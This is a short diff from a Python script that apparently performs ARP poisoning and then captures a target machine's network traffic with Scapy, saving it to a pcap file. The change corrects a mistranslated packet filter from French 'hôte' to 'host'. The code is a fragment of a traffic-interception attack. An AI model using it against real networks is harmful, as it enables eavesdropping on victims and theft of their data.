@@ -78,7 +78,7 @@ poison_thread.start()
 
 #Sniff traffic and write to file. Capture is filtered on target machine
 try:
-    sniff_filter = "ip hôte " + target_ip
+    sniff_filter = "ip host " + target_ip
     print("[*] Début de la capture réseau. Packet Count: {packet_count}. Filter: {sniff_filter}")
     packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
     wrpcap(target_ip + "_capture.pcap", packets)#Extraction pcap
